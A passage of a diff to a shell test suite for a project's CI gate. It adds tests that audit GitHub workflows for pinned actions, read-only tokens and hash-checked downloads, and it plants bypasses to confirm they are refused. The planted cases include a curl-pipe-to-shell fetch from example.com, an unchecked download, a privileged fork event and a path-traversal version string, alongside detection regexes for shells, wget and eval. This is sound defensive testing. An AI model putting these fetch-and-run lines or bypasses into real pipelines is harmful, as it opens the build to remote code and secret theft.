@@ -44,13 +44,21 @@ if [ "$(grep -c '^if part ' "$0")" != "$(printf '%s\n' "$sections" | grep -c .)"
 fi
 case ${ONLY:-,} in
 *,*)
-	pids=
+	pids= failed=
+	settle() { wait "${1%%:*}" || { cat "$t/${1#*:}.out" >&2; failed=1; }; }
 	for s in $(printf '%s' "${ONLY:-$(printf '%s\n' "$sections" | sort -u | paste -sd, -)}" | tr , ' '); do
 		ONLY=$s sh "$0" >"$t/$s.out" 2>&1 &
 		pids="$pids $!:$s"
+		# HOOKS_JOBS caps the sections run at once, the oldest settled first: on GitHub's four cores, all eighty at once timed out
+		# the sections bound by time (F13180). Unset, every section starts at once.
+		set -- $pids
+		if [ -n "${HOOKS_JOBS:-}" ] && [ "$#" -ge "$HOOKS_JOBS" ]; then
+			settle "$1"
+			shift
+			pids="$*"
+		fi
 	done
-	failed=
-	for p in $pids; do wait "${p%%:*}" || { cat "$t/${p#*:}.out" >&2; failed=1; }; done
+	for p in $pids; do settle "$p"; done
 	[ -z "$failed" ] || exit 1
 	echo "hooks: ok"
 	finished=1
@@ -293,39 +301,6 @@ done
 for f in "$here"/*.sh "$hooks"/*; do
 	grep -nE '^[[:space:]]*[A-Za-z_]+=\$\(mktemp' "$f" | grep -vE 'mktemp (-d )?"\$\{TMPDIR:-/tmp\}/' | grep -q . && fail "$(basename "$f") makes a temporary file outside \$TMPDIR"
 done
-# The CI runs the full gate, reads the repository and nothing more, and pins every action and
-# download: a tag or a branch can be moved to code nobody reviewed.
-python3 -I - "$here/../.github/workflows/gate.yml" <<'PY' || fail "the CI workflow lost a promise"
-import re, sys
-# Comments out: a promise kept only in a comment is not kept.
-ci = re.sub(r"[ \t]*#.*$", "", open(sys.argv[1]).read(), flags=re.M)
-def has(line, why):
-    assert re.search("^" + line + "$", ci, re.M), why
-uses = re.findall(r"uses:\s*(\S+)", ci)
-assert uses and all(re.fullmatch(r"[\w.-]+/[\w.-]+@[0-9a-f]{40}", u) for u in uses), f"an action not pinned to a commit: {uses}"
-trigger = re.search(r"^on:\n((?:  .*\n)+)", ci, re.M)
-assert trigger and re.findall(r"^  (\S+):", trigger.group(1), re.M) == ["push"], "the CI runs on something else than a push"
-assert ci.count("permissions:") == 1 and "write" not in ci, "the CI may write"
-has(r"permissions:\n  contents: read", "the CI may write")
-assert "secrets." not in ci and "continue-on-error" not in ci, "the CI reads a secret or lets a step fail"
-# One condition only, on one step: when the gate fails, the pictures the stories' journeys wrote
-# where Linux had none are kept for review; no step of the gate itself can be skipped.
-conditions = re.findall(r"^\s+(?:- )?if:.*$", ci, re.M)
-assert [c.strip() for c in conditions] == ["if: failure()"], f"a CI step can be skipped: {conditions}"
-has(r"      - name: Linux's pictures of the stories, written where none was approved\n        if: failure\(\)\n        uses: actions/upload-artifact@[0-9a-f]{40}\n        with:\n          name: stories-pictures-linux\n          path: app/tests/stories/__screenshots__/linux/\n          if-no-files-found: ignore\n          retention-days: 7",
-    "the CI does not keep Linux's pictures when the gate fails, or keeps more")
-has(r"    runs-on: ubuntu-24\.04", "the CI runs on a machine it does not name")
-has(r"        run: sh scripts/check\.sh --full", "the CI does not run the full gate, or lets it fail")
-# The CI judges every harness mutant afresh: it keeps no cache of verdicts, nor StrykerJS's, from one run to the next.
-assert "gnoworld-tools" not in ci and not re.search(r"path:.*(\.cache\s*$|~/\.cache|HOME)", ci, re.M), "the CI keeps the tools' cache of verdicts"
-has(r"          persist-credentials: false", "the CI keeps its token on disk for the gate")
-has(r"          fetch-depth: 0", "the CI cannot compare the branch with main")
-has(r"      GNO_COMMIT: [0-9a-f]{40}", "the CI builds gno from a name that can move")
-has(r'          echo "[0-9a-f]{64}  \$RUNNER_TEMP/gitleaks\.tgz" \| sha256sum -c', "the CI trusts a download it did not check")
-assert not re.search(r"\|\s*(ba)?sh\b", ci), "the CI runs a download"
-assert "--frozen-lockfile" in ci and "--ignore-scripts" in ci, "the CI trusts a lockfile it did not check"
-has(r"        run: node app/node_modules/@playwright/test/cli\.js install --with-deps --only-shell chromium", "the CI has no browser for the journeys")
-PY
 # check.sh refuses a .node-version that is more than a version, which would steer PATH.
 nv="$t/nodeversion" && mkdir -p "$nv/scripts" && cp "$gate_file" "$nv/scripts/check.sh"
 printf '24.22.0/../../../../evil\n' >"$nv/.node-version"
@@ -2586,9 +2561,9 @@ c="$t/tests/cov" # under a folder named tests: only paths inside the repository 
 mkdir -p "$c/src" "$c/coverage"
 git -C "$c" init -q && printf 'one\n' >"$c/src/a.ts" && git -C "$c" add -A && git -C "$c" commit -qm base
 printf 'one\ntwo\nthree\nfour\n' >"$c/src/a.ts"
-cover() { # $1: hit count of line 3's statement
+cover() { # $1: hit count of line 3's statement; COVERAGE_ALL=1 (check.sh --everything) unless all= is set empty
 	printf '{"%s/src/a.ts":{"statementMap":{"0":{"start":{"line":2}},"1":{"start":{"line":3}},"2":{"start":{"line":4}}},"s":{"0":1,"1":%s,"2":1}}}' "$c" "$1" >"$c/coverage/coverage-final.json"
-	(cd "$c" && python3 -I "$patch" HEAD 85 >/dev/null 2>&1)
+	(cd "$c" && COVERAGE_ALL="${all-1}" python3 -I "$patch" HEAD 85 >/dev/null 2>&1)
 }
 unmeasured() { # each file, alone in the patch, must be measured
 	for f; do
@@ -2601,6 +2576,24 @@ cover 1 || fail "patch_coverage refused a patch whose lines are all run"
 cover 0 && fail "patch_coverage accepted a patch at 67%, under 85%"
 printf 'export const b = 1;\n' >"$c/src/b.ts" && git -C "$c" add src/b.ts
 cover 1 && fail "patch_coverage accepted a changed file the coverage report does not measure"
+# A tier-1 file, by docs/REVIEW.md as this script's own tree holds it (the base's on GitHub), is refused unmeasured under the
+# default coverage too; with no table to read, every file is tier 1 (D13166's security review).
+all=
+lone="$t/lone" && mkdir -p "$lone/scripts" && cp "$patch" "$here/repo_files.py" "$here/speeds.py" "$lone/scripts/"
+(cd "$c" && COVERAGE_ALL= python3 -I "$lone/scripts/patch_coverage.py" HEAD 85 >/dev/null 2>&1) &&
+	fail "patch_coverage, with no docs/REVIEW.md beside it, let an unmeasured file through: no table is no tier 1"
+git -C "$c" rm -q --cached src/b.ts && rm "$c/src/b.ts"
+mkdir -p "$c/server/src/login" && printf 'export const t = 1;\n' >"$c/server/src/login/t.ts" && git -C "$c" add server/src/login/t.ts
+cover 1 && fail "patch_coverage accepted a changed tier-1 file the default coverage does not measure"
+git -C "$c" rm -q --cached server/src/login/t.ts && rm "$c/server/src/login/t.ts"
+printf 'export const b = 1;\n' >"$c/src/b.ts" && git -C "$c" add src/b.ts
+unset all
+# The default coverage measures tier 1 alone, whose paths check_docs.py holds in its include: a file it leaves out is not refused,
+# and the floor still holds beside it (F13179).
+all=
+cover 1 || fail "patch_coverage refused a changed file the default coverage leaves out, which measures tier 1 alone (F13179)"
+cover 0 && fail "patch_coverage accepted a patch at 67% beside a file the default coverage leaves out"
+unset all
 git -C "$c" rm -q --cached src/b.ts && rm "$c/src/b.ts"
 printf 'x\n' >"$c/src/a.test.ts" && printf 'x\n' >"$c/vitest.config.ts" && git -C "$c" add src/a.test.ts vitest.config.ts
 cover 1 || fail "patch_coverage refused a changed test or config file, which coverage never measures"
@@ -2815,6 +2808,10 @@ echo x >"$c2/scripts/tool.sh" && git -C "$c2" add scripts/tool.sh
 outside_() { (cd "$c2" && env -u SANDBOX_RUNTIME "$@" sh "$rh/pre-commit" 2>&1 >/dev/null); }
 chmod a-w "$rh/pre-commit"
 outside_ | grep -qF "is committed in Alexis's Terminal alone" || fail "pre-commit took a sandboxed commit of a harness file once SANDBOX_RUNTIME was unset (D241)"
+# Under dash, Linux's sh, a redirection a special builtin cannot open ends the whole shell: the hook ended in silence (F13177).
+command -v dash >/dev/null || fail "no dash to run pre-commit under, as Linux's sh does (F13177)"
+(cd "$c2" && env -u SANDBOX_RUNTIME dash "$rh/pre-commit" 2>&1 >/dev/null) | grep -qF "is committed in Alexis's Terminal alone" ||
+	fail "pre-commit under dash, Linux's sh, ended in silence when it could not write itself (F13177)"
 chmod u+w "$rh/pre-commit"
 outside_ >/dev/null || fail "pre-commit refused a harness file in Alexis's Terminal, its gate recorded"
 outside_ SANDBOX_RUNTIME=1 | grep -qF "is committed in Alexis's Terminal alone" || fail "pre-commit let a harness file through with SANDBOX_RUNTIME set, its hook writable (D241)"
@@ -6938,7 +6935,7 @@ sha=$(python3 -I -c 'import hashlib, sys; print(hashlib.sha256(open(sys.argv[1],
 chk() {
 	case "${SHA:-}" in UNSET) shaenv="-u NGINX_SHA256" ;; EMPTY) shaenv="NGINX_SHA256=" ;; "") shaenv="NGINX_SHA256=$sha" ;; *) shaenv="NGINX_SHA256=$SHA" ;; esac
 	rm -f "$nc/stub.pid"
-	(cd "$nc" && env $shaenv GNOWORLD_TOOLS="$nc/tools" STUB_LOG="$nc/stub.log" STUB_PID="$nc/stub.pid" STUB_WARN="${WARN:-}" STUB_NOSERVE="${NOSERVE:-}" STUB_DOUBLE="${DOUBLE:-}" python3 -I "$here/check_nginx.py" 2>&1)
+	(cd "$nc" && env -u GNOWORLD_BUILD $shaenv ${BUILD:+GNOWORLD_BUILD="$BUILD"} GNOWORLD_TOOLS="$nc/tools" STUB_LOG="$nc/stub.log" STUB_PID="$nc/stub.pid" STUB_WARN="${WARN:-}" STUB_NOSERVE="${NOSERVE:-}" STUB_DOUBLE="${DOUBLE:-}" python3 -I "$here/check_nginx.py" 2>&1)
 }
 # What a failed check leaves running is a server per failed merge check: the nginx it started is dead, whatever failed.
 stopped() { # $1: what failed
@@ -7069,6 +7066,11 @@ mv "$nc/app/build/csp.conf" "$nc/csp.keep"
 out=$(chk) && fail "check_nginx passed with no build's table: $out"
 printf '%s\n' "$out" | grep -qi "csp.conf" || fail "check_nginx did not name the missing table: $out"
 mv "$nc/csp.keep" "$nc/app/build/csp.conf"
+# GitHub's build job builds into the folder GNOWORLD_BUILD names (app/build-gate/ci), and check_nginx reads it there (F13176).
+mv "$nc/app/build" "$nc/app/build-gate-ci"
+out=$(BUILD="$nc/app/build-gate-ci" chk) || fail "check_nginx did not read the build GNOWORLD_BUILD names: $out"
+out=$(chk) && fail "check_nginx passed with no build in app/build and no GNOWORLD_BUILD: $out"
+mv "$nc/app/build-gate-ci" "$nc/app/build"
 # The pinned binary is documented where Alexis sets the tools up, and the harness doc says how the lock works.
 grep -q "gnoworld-tools/nginx-1\.30\.6/nginx" "$here/../docs/DEVELOPMENT.md" && grep -q "scripts/nginx\.sha256" "$here/../docs/DEVELOPMENT.md" && grep -qi "sha256\|checksum" "$here/../docs/DEVELOPMENT.md" || fail "docs/DEVELOPMENT.md does not say how to get the pinned nginx 1.30.6 with its checksum"
 grep -qi "merge.lock\|one merge check at a time" "$here/../docs/HARNESS.md" || fail "docs/HARNESS.md does not say that merge checks take a lock, one at a time"
@@ -10000,6 +10002,398 @@ grep -qF " TOOLS=$w_home/.cache/gnoworld-tools TMP=" "$w/log.seatbelt" || fail "
 # Every call of the tailnet-preview script, up and down, from /: its python3 -c imports first from the folder it runs from (F4962).
 [ -s "$w/log.preview-cwd" ] && [ -z "$(grep -vx / "$w/log.preview-cwd")" ] ||
 	fail "workshop.sh ran the tailnet-preview script from another folder than /: $(sort -u "$w/log.preview-cwd" 2>/dev/null)"
+fi
+
+if part ci; then
+# GitHub judges main (the harness overhaul, phase 2): the two workflows read the repository and nothing more, pin every action and
+# download, run on a pull request, a push to main or by hand and never on a fork's privileged events, and hand their verdict to one
+# job, gate-ok, the one check main requires. What judges a change comes from the commit it is judged against (the red team's tests 9
+# and 10), and CODEOWNERS holds the core. The checker reads the promises without comments and the bans with them; each bypass the
+# red pass found is planted in a copy and must be refused.
+cat >"$t/ci_static.py" <<'PY'
+import ast, json, pathlib, re, subprocess, sys
+root = pathlib.Path(sys.argv[1])
+gh = root / ".github"
+wf = gh / "workflows"
+names = sorted(p.name for p in wf.iterdir())
+assert names == ["gate.yml", "nightly.yml"], f"the workflows are {names}: one no promise reads"
+assert not (gh / "actions").exists(), "a local action: GitHub's workflow right may not cover it, so the agent could change it"
+assert not any((d / n).exists() for d in (root, gh) for n in ("zizmor.yml", "zizmor.yaml", ".zizmor.yml")), "a zizmor config could silence it"
+strip = lambda text: re.sub(r"(?:^|[ \t])#.*$", "", text, flags=re.M)
+def runs(text):
+    """Each run: block's script, on its line or in a block of any indicator."""
+    out, lines = [], text.split("\n")
+    for i, line in enumerate(lines):
+        m = re.match(r"^(\s*)(- )?run:[ \t]*(.*)$", line)
+        if not m:
+            continue
+        key = len(m.group(1)) + (2 if m.group(2) else 0)
+        if not re.fullmatch(r"[|>][0-9+-]*", m.group(3).strip()):
+            out.append(m.group(3))
+            continue
+        body = []
+        for nxt in lines[i + 1:]:
+            if nxt.strip() and len(nxt) - len(nxt.lstrip()) <= key:
+                break
+            body.append(nxt)
+        out.append("\n".join(body))
+    return out
+def jobs(text):
+    at = text.index("\njobs:\n")
+    found = list(re.finditer(r"^  ([a-z][a-z0-9-]*):\n", text[at:], re.M))
+    return {m.group(1): text[at + m.start():at + (found[k + 1].start() if k + 1 < len(found) else len(text) - at)] for k, m in enumerate(found)}
+def conditions(job):
+    """The job's own `if:` and its steps' ones, with or without ${{ }}."""
+    bare = lambda c: re.sub(r"^\$\{\{ (.*) \}\}$", r"\1", c.strip())
+    return [bare(c) for c in re.findall(r"^    if:(.*)$", job, re.M)], [bare(c) for c in re.findall(r"^ {6,}(?:- )?if:(.*)$", job, re.M)]
+pnpm = json.loads((root / "package.json").read_text())["packageManager"].split("@")[1]
+required = ast.literal_eval(re.search(r"^REQUIRED = (\{.*?^\})", (root / "scripts" / "ci_gate_ok.py").read_text(), re.M | re.S).group(1))
+TRIGGERS = {"gate.yml": ["pull_request", "push", "workflow_dispatch"], "nightly.yml": ["schedule", "workflow_dispatch"]}
+WRITES = {"gate.yml": [], "nightly.yml": ["issues"]}
+TOKENS = {"gate.yml": 0, "nightly.yml": 1}
+STEP_IFS = {"failure()", "needs.changes.outputs.ui == 'true' || needs.changes.outputs.harness == 'true'",
+            "needs.changes.outputs.nginx == 'true'", "needs.changes.outputs.migrations == 'true'"}
+for name in names:
+    raw = (wf / name).read_text()
+    ci = strip(raw)
+    # The bans read the whole text: a comment cannot hide what follows it on its line.
+    assert re.findall(r"^[\"']?(?:on|true|yes|y)[\"']?\s*:", raw, re.M | re.I) == ["on:"], f"{name}: its events are named in another form than one `on:` block"
+    assert not re.search(r"\bsecrets\s*[.\[]|toJSON\(\s*secrets|secrets:\s*inherit|GITHUB_TOKEN|continue-on-error|write-all|read-all|zizmor:\s*ignore", raw), f"{name}: it reads a secret, lets a step fail, or silences zizmor"
+    assert len(re.findall(r"github\s*(?:\.\s*token|\[\s*['\"]token)", raw)) == TOKENS[name], f"{name}: the token reaches a step that does not report"
+    assert re.findall(r"^\s+([\w-]+):\s*write\s*$", raw, re.M) == WRITES[name], f"{name}: a job may write"
+    for script in runs(raw):
+        assert "${{" not in script, f"{name}: an expression inside a script, a way in for injected text: {script.strip()[:80]}"
+    assert not re.search(r"\|\s*(?:sudo\s+)?(?:ba|z|da|k|c)?sh\b|<\(\s*(?:curl|wget)|\bwget\b|\beval\b", raw), f"{name}: it runs a download or a string"
+    assert not re.search(r"\b(?:npm|yarn|gem|cargo|go)\s+(?:install|add|exec|dlx|get|ci)\b|\bnpx\b|\bpnpm\s+(?:add|dlx)\b|\b(?:uvx?|pipx)\s|\bgo run \S*@", raw), f"{name}: it installs or runs a package outside the lockfile"
+    assert all(m == " --no-deps --require-hashes -r" for m in re.findall(r"\bpip3?\s+install((?:\s+-\S+)*)", raw)), f"{name}: a pip install without its hashes"
+    installs = re.findall(r"pnpm\"?\s+install(\s+--frozen-lockfile)?", raw)
+    assert installs and all(installs), f"{name}: a pnpm install outside the lockfile"
+    lines = raw.split("\n")
+    for k, line in enumerate(lines):
+        if re.search(r"\bcurl\b", line):
+            m = re.fullmatch(r'curl --fail --retry 3 -sSLo "(\$RUNNER_TEMP/[\w.-]+)" (https://\S+)', line.strip())
+            assert m, f"{name}: a download in a form no check reads: {line.strip()[:80]}"
+            check = r'echo "[0-9a-f]{64,128}  ' + re.escape(m.group(1)) + r'" \| sha(?:256|512)sum -c'
+            assert re.fullmatch(check, lines[k + 1].strip()), f"{name}: {m.group(2)} is not checked against its hash"
+    for v in re.findall(r"https://registry\.npmjs\.org/@pnpm/exe\.linux-x64/-/exe\.linux-x64-(\S+)\.tgz", raw):
+        assert v == pnpm, f"{name}: pnpm {v}, but package.json names {pnpm}"
+    uses = re.findall(r"uses:\s*(\S+)", raw)
+    assert uses and all(re.fullmatch(r"[\w.-]+/[\w.-]+@[0-9a-f]{40}", u) for u in uses), f"{name}: an action not pinned to a commit: {uses}"
+    assert raw.count("actions/checkout@") == raw.count("persist-credentials: false") > 0, f"{name}: a checkout keeps its token on disk"
+    assert all(re.fullmatch(r"[0-9a-f]{40}", c) for c in re.findall(r"GNO_COMMIT:\s*(\S+)", raw)), f"{name}: gno built from a name that can move"
+    assert "gnoworld-tools" not in raw and not re.search(r"path:.*(~|HOME|\.cache/(?!gno-toolchain))", raw), f"{name}: it keeps a cache of verdicts"
+    # The promises read the text without comments: one kept only in a comment is not kept.
+    on = re.search(r"^on:\n((?:[ \t]+.*\n|\n)+)", ci, re.M)
+    assert on and re.findall(r"^  ([a-z_]+):", on.group(1), re.M) == TRIGGERS[name], f"{name}: it runs on other events than {TRIGGERS[name]}"
+    assert not re.search(r"^\s+(paths|paths-ignore|branches-ignore|tags|tags-ignore):", on.group(1), re.M), f"{name}: a filter that leaves a required check pending"
+    assert re.search(r"^permissions:\n  contents: read\n(?![ \t])", ci, re.M), f"{name}: its token may do more than read"
+    for job, text in jobs(ci).items():
+        assert re.search(r"^    runs-on: ubuntu-24\.04$", text, re.M), f"{name}: {job} runs on a machine it does not name"
+        t = re.search(r"^    timeout-minutes: (\d+)$", text, re.M)
+        budget = 355 if name == "nightly.yml" else 40 if job == "deploy-stack" else 15
+        assert t and int(t.group(1)) <= budget, f"{name}: {job} has no time limit, or one past its {budget} min"
+gate = strip((wf / "gate.yml").read_text())
+J = jobs(gate)
+assert "  group: gate-${{ github.event.pull_request.number || (github.event_name == 'push' && github.run_id) || github.ref }}\n  cancel-in-progress: ${{ github.event_name == 'pull_request' }}\n" in gate, "gate.yml may cancel or leave pending a run of main, or one pull request's run another's"
+assert sorted(required) == sorted(set(J) - {"gate-ok", "changes"}), f"ci_gate_ok.py judges other jobs than gate.yml runs: {sorted(required)}"
+for job, text in J.items():
+    own, steps = conditions(text)
+    if job in required:
+        want = [" && ".join(f"needs.changes.outputs.{f} == 'true'" for f in required[job])] if required[job] else []
+        assert own == want, f"gate.yml: {job} runs on another condition than ci_gate_ok.py calls for it: {own}"
+        assert re.search(r"^    needs: \[changes\]$", text, re.M), f"gate.yml: {job} does not start from the change's base"
+    assert set(steps) <= STEP_IFS, f"gate.yml: a step of {job} may be skipped: {set(steps) - STEP_IFS}"
+ok = J["gate-ok"]
+assert conditions(ok) == (["always()"], []), "gate-ok is skipped when a job fails, and a skipped required check passes"
+# A block list, one job a line (Prettier rewraps a long flow list).
+needs = re.search(r"^    needs:\n((?:      - [a-z0-9-]+\n)+)", ok, re.M)
+waits = re.findall(r"- ([a-z0-9-]+)", needs.group(1)) if needs else []
+assert waits[:1] == ["changes"] and len(waits) == len(set(waits)) and sorted(waits) == sorted(set(J) - {"gate-ok"}), "gate-ok does not wait for every job"
+ch = J["changes"]
+printed = list(dict.fromkeys(re.findall(r'echo "([a-z0-9]+)=', (root / "scripts" / "ci_changes.sh").read_text())))
+outs = re.findall(r"^      ([a-z0-9]+): \$\{\{ steps\.diff\.outputs\.([a-z0-9]+) \}\}$", ch, re.M)
+assert len(printed) > 2 and outs == [(p, p) for p in printed], f"changes' outputs are not what ci_changes.sh prints: {outs}"
+for case in ('pull_request) BASE=$(git merge-base "origin/$BASE_REF" HEAD) ;;',
+             'push) if git cat-file -e "$BEFORE^{commit}" 2>/dev/null; then BASE=$BEFORE; else BASE=$(git rev-parse HEAD^1); fi ;;',
+             "*) BASE=$(git merge-base origin/main HEAD) ;;", "BEFORE: ${{ github.event.before }}", 'cat "$RUNNER_TEMP/flags" >>"$GITHUB_OUTPUT"'):
+    assert case in ch, f"changes takes its base, or hands its flags, another way: {case}"
+BASE = '"$RUNNER_TEMP/base/scripts/'
+archive = 'git archive "$BASE" scripts docs/REVIEW.md .githooks | tar -x -C "$RUNNER_TEMP/base"'
+for job, script in (("changes", "ci_changes.sh"), ("gate-ok", "ci_gate_ok.py"), ("regressions", "check_regressions.py"),
+                    ("regressions", "check_migrations.py"), ("coverage", "patch_coverage.py"), ("risk", "stryker_lines.py")):
+    assert BASE + script + '"' in J[job], f"gate.yml: {job} does not run the base's {script}"
+    assert not re.search(r"(?<!base/)scripts/" + re.escape(script), J[job]), f"gate.yml: {job} runs the change's own {script}"
+assert archive in ch and gate.count(archive) == 2, "the judge is not read from the base"
+for job in ("lint", "coverage", "risk", "regressions", "gate-ok"):
+    assert re.search(r"^      - \*base$", J[job], re.M) or archive in J[job], f"gate.yml: {job} reads no base"
+assert '--config "$RUNNER_TEMP/base/scripts/$config"' in J["lint"] and "--ignore-gitleaks-allow" in J["lint"] and "for config in gitleaks.toml gitleaks-private.toml; do" in J["lint"], "lint scans the change with its own rules"
+z = J["zizmor"]
+assert re.search(r'echo "zizmor==[0-9.]+ --hash=sha256:[0-9a-f]{64}" >"\$RUNNER_TEMP/zizmor\.txt"', z), "zizmor is installed unpinned"
+assert re.search(r"^        run: \$RUNNER_TEMP/zizmor/bin/zizmor --offline --no-progress \.github/workflows$", z, re.M), "zizmor does not read every workflow"
+night = jobs(strip((wf / "nightly.yml").read_text()))
+writer = [job for job, text in night.items() if re.search(r":\s*write\s*$", text, re.M)]
+assert writer == ["report"] and not re.search(r"actions/checkout@|scripts/|- \*", night["report"]), "the job that writes runs the repository's code"
+# The steps both workflows hold, each written once per file (an anchor stops at its file's end; .jscpd.json leaves the workflows
+# out for that): one definition each, the same text in both, so they cannot drift apart.
+def anchors(text):
+    found = re.findall(r"^      - &([\w-]+)\n((?:        .*\n)*)", text, re.M)
+    assert len(found) == len(dict(found)), f"an anchor defined twice: {sorted(n for n, _ in found if [m for m, _ in found].count(n) > 1)}"
+    return dict(found)
+ga, na = anchors((wf / "gate.yml").read_text()), anchors((wf / "nightly.yml").read_text())
+assert {"checkout", "go", "node", "pnpm", "chromium", "ergo", "gno-cache", "gno", "gitleaks"} <= set(ga) & set(na), f"the workflows no longer share their setup steps: {sorted(set(ga) & set(na))}"
+assert all(ga[k] == na[k] for k in set(ga) & set(na)), f"a step both workflows hold differs: {sorted(k for k in set(ga) & set(na) if ga[k] != na[k])}"
+JSCPD_IGNORE = ["docs/**", "gno/**", "pnpm-lock.yaml", "**/node_modules/**", "**/*.test.ts", "**/.git/**", "app/tests/chain/recorded/**",
+                "stryker.all.config.json", ".github/workflows/**"]
+assert json.loads((root / ".jscpd.json").read_text()).get("ignore") == JSCPD_IGNORE, "jscpd leaves out more than the workflows, or reads them"
+assert re.search(r"^        run: SKIP=missing_picture,tokens_pictures python3 -I scripts/probe\.py$", J["harness-selftest"], re.M), "the gate's probe.py skips more than the Mac's pictures"
+# Playwright on GitHub: no picture compared and nothing else turned off (no snapshot of any other kind in a spec), no test
+# left out but the flash's, whose phrase names one test in app/tests; a --grep picks only what it is known to.
+specs = {p: p.read_text() for p in (root / "app" / "tests").rglob("*.ts")}
+assert not [p for p, s in specs.items() if re.search(r"\bto(?:Match(?:Aria)?Snapshot)\(", s)], "a spec compares a snapshot --ignore-snapshots would pass"
+assert sum(s.count("a flash raised from a dialog shows above its scrim, at the top centre") for s in specs.values()) == 1, "the stories' left-out phrase names no test, or more than one"
+for name in names:
+    for line in re.findall(r"cli\.js test (.*)$", (wf / name).read_text(), re.M):
+        assert not re.search(r"--(?:pass-with-no-tests|last-failed|only-changed|max-failures)", line), f"{name}: a Playwright run that can pass on less: {line[:90]}"
+        assert re.findall(r"--grep-invert\s+('[^']*'|\S+)", line) in ([], ["'a flash raised from a dialog shows above its scrim, at the top centre$'"]), f"{name}: a journey or story left out beyond the flash's test: {line[:90]}"
+        picks = re.findall(r"--grep\s+('[^']*'|\S+)", line)
+        # The two picks it knows: flights' smoke (the journeys), the budgets' @gate tests (the build).
+        assert (not picks or line.endswith("flights.spec.ts --grep 'flies to the system aimed at|flies from the cosmos to a world'")
+                or line.endswith("app/tests/e2e/budgets.spec.ts app/tests/e2e/chunks.spec.ts --grep @gate")), f"{name}: a --grep that picks more than it knows: {line[:90]}"
+        assert "--update-snapshots" not in line or "--update-snapshots=none" in line, f"{name}: a run that writes pictures: {line[:90]}"
+vite = (root / "vitest.config.ts").read_text()
+assert 'const STORE = new URL("node_modules/.pnpm", import.meta.url);\n' in vite and re.findall(r"allow: \[(.*)\]", vite) == ['fileURLToPath(new URL(".", import.meta.url)), ...(existsSync(STORE) ? [realpathSync(STORE)] : [])'], "Vite may read more than the root and the borrowed store"
+rn = re.search(r"^    needs: \[(.*)\]$", night["report"], re.M)
+assert rn and sorted(rn.group(1).split(", ")) == sorted(set(night) - {"report"}) and conditions(night["report"]) == (["always()"], []), "a red job of the night reports nothing"
+assert 'gh issue list --repo "$REPO" --state open --app github-actions ' in night["report"], "the night's report may comment on another account's issue"
+for job, line in (("harness-nightly", "python3 -I scripts/harness_mutate.py"), ("harness-nightly", "sh scripts/test_hooks.sh"),
+                  ("harness-nightly", "SKIP=missing_picture,tokens_pictures python3 -I scripts/probe.py"), ("stryker", 'pnpm exec stryker run --concurrency "$(nproc)"'),
+                  ("secrets-history", "sh scripts/scan_secrets.sh"), ("deploy-mutants", "sh deploy/test.sh --mutants")):
+    assert re.search(r"^        run: " + re.escape(line) + "$", night[job], re.M), f"the night's {job} does not run {line} whole"
+merge = re.search(r'^\s*journeys="(app/[^"]*)"', (root / "scripts" / "check.sh").read_text(), re.M)
+assert merge and set(merge.group(1).split()) <= set(re.findall(r"app/tests/e2e/\S+\.spec\.ts", night["journeys-all"])), "the night leaves out a journey of the merge list"
+# As GitHub reads it: the last line whose pattern matches a path gives its owners, a line with none removes them.
+rules = [(l.split()[0], l.split()[1:]) for l in (gh / "CODEOWNERS").read_text().splitlines() if l.strip() and not l.lstrip().startswith("#")]
+records = (root / ".githooks" / "records.sh").read_text()
+at = records.index("harness() (")
+listed = [p.strip("'") for p in records[at:records.index(" )\n", at)].replace("\\\n", " ").split(" -- ", 1)[1].split()]
+def matches(o, p):
+    """Whether a CODEOWNERS pattern holds the path: a folder, the path, or a pattern whose * stays within one part."""
+    pattern = re.escape(o if o.startswith("/") else "**/" + o).replace(r"\*\*/", "(?:.*/)?").replace(r"\*", "[^/]*")
+    return bool((o.endswith("/") and ("/" + p + "/").startswith(o)) or re.fullmatch(pattern.lstrip("/"), p) or re.fullmatch(pattern, "/" + p))
+def owned(p):
+    last = [who for o, who in rules if matches(o, p)]
+    return bool(last) and last[-1] == ["@alexiscolin"]
+try:
+    files = subprocess.run(["git", "ls-files", "-z"], cwd=root, capture_output=True, text=True, check=True).stdout.split("\0")
+except (subprocess.CalledProcessError, FileNotFoundError):
+    files = [str(f.relative_to(root)) for f in root.rglob("*") if f.is_file() and "node_modules" not in f.parts]
+packages = [f for f in files if re.search(r"(^|/)(package\.json|tsconfig[^/]*\.json|pnpm-[^/]*\.yaml|\.npmrc|\.pnpmfile\.[cm]js)$", f)]
+under = [f for f in files if any(f.startswith(d + "/") for d in listed + ["deploy"])]  # each file of a core folder, as a later line may unown it
+for p in listed + [".github/CODEOWNERS", "docs/REVIEW.md", "deploy/test.sh", "CLAUDE.md", "jarvis/src/allowlist.ts"] + packages + under:
+    assert owned(p.replace("*", "x")), f"CODEOWNERS does not hold {p}: a change to it would merge without an owner"
+PY
+python3 -I "$t/ci_static.py" "$here/.." || fail "a workflow lost a promise"
+python3 -I - "$here/.." "$t/ci_static.py" "$t/ci_plant" <<'PY' || fail "a planted bypass of the workflows' promises passed"
+import pathlib, shutil, subprocess, sys
+root, checker, plant = pathlib.Path(sys.argv[1]), sys.argv[2], pathlib.Path(sys.argv[3])
+G, N, O, K = ".github/workflows/gate.yml", ".github/workflows/nightly.yml", ".github/CODEOWNERS", "scripts/ci_gate_ok.py"
+JS, V, B = ".jscpd.json", "vitest.config.ts", "app/tests/stories/behaviours.spec.ts"
+CASES = [
+    (G, "        run: pnpm run format:check\n", '        run: echo " #"; curl -sSL https://example.com/x | sh\n', "a pipe to a shell behind a quoted #"),
+    (G, "        run: pnpm run lint\n", "        run: |+\n          echo ${{ github.head_ref }}\n", "an expression in a |+ block"),
+    (G, "      - name: knip (unused files, exports, dependencies)\n", "      - name: knip (unused files, exports, dependencies)\n        env:\n          K: ${{ secrets['K'] }}\n", "a secret read by index"),
+    (G, "        run: pnpm run copies\n", "        run: curl -sSL https://example.com/t.tgz | tar -xz\n", "a download in another form"),
+    (G, '"$RUNNER_TEMP/pnpm/pnpm" install --frozen-lockfile', '"$RUNNER_TEMP/pnpm/pnpm" install', "a pnpm install without the lockfile"),
+    (G, "        run: pnpm run comments\n", "        run: pnpm dlx some-tool\n", "a package run outside the lockfile"),
+    (G, "permissions:\n  contents: read\n", "permissions:\n  contents: read\n  pull-requests: write\n", "a write right"),
+    (G, "\n  pull_request:\n", "\n  pull_request_target:\n", "a fork's privileged event"),
+    (G, "        run: pnpm run unused\n", "        run: pnpm run unused # zizmor: ignore[template-injection]\n", "zizmor silenced"),
+    (G, "      - name: Vitest, a third of the files, one retry\n", "      - name: Vitest, a third of the files, one retry\n        if: needs.changes.outputs.ui == 'true'\n", "a test step skipped by a flag"),
